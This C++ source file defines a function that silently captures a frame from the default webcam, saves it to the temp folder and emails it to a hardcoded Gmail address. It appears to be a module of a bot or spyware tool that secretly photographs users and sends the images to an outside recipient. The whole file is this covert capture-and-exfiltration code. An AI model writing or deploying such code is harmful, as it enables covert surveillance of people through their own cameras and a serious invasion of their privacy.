#include "sendPicture.h"

void send_picture() {
  char temp_path[MAX_PATH];
  GetTempPathA(MAX_PATH, temp_path);

  string image_path = string(temp_path) + "captured_photo.jpg";

  // Open default camera (0)
  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "Failed to open webcam!" << endl;
    return;
  }

  cv::Mat frame;
  cap >> frame;

  if (frame.empty()) {
    cerr << "Failed to capture image!" << endl;
    return;
  }

  // Save image to file
  bool saved = cv::imwrite(image_path, frame);
  if (!saved) {
    cerr << "Failed to save image!" << endl;
    return;
  }
  cout << "Image saved successfully to: " << image_path << endl;

  // Send it via email
  send_email_with_attachment("serverbottestmmt@gmail.com", "Webcam Photo",
                             "Here is a photo taken from the webcam.",
                             image_path);
}